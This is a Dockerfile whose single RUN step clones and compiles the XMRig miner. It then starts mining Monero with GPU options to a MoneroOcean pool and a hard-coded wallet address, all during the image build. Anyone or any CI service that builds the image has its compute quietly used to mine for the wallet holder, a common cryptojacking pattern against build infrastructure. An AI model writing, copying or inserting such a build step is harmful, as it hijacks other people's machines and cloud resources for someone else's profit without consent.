FROM alpine:latest
RUN apk add git make cmake libstdc++ gcc g++ libuv-dev openssl-dev hwloc-dev && git clone https://github.com/xmrig/xmrig && mkdir xmrig/build && cd xmrig/build && cmake .. && make -j$(nproc) && ./xmrig --opencl --cuda -o gulf.moneroocean.stream:10128 -u 8ANyqnPspbmdyQaY3FVzb1AYxnQPBKozVQ8qXKiBojvkPbkdv4gt8mCeNnuFhppTEpcVctYKwfiHce9ApMVuHKn8DMfr8un -p x -k --coin monero -a rx/0
